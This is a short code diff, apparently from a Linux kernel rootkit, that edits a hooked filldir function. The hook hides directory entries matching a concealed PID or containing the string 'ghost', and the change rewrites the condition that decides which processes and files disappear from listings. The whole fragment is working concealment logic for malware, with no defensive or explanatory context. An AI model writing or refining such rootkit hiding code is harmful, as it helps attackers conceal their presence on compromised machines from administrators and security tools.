@@ -166,7 +166,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 	int ret = 0;
 	find_pid_hide();
 	pid = simple_strtol(name, &endp, 10);
-	if (pid != hide_pid || !strstr(name, "ghost")|| !strstr(name,protected))
+	if (pid != hide_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
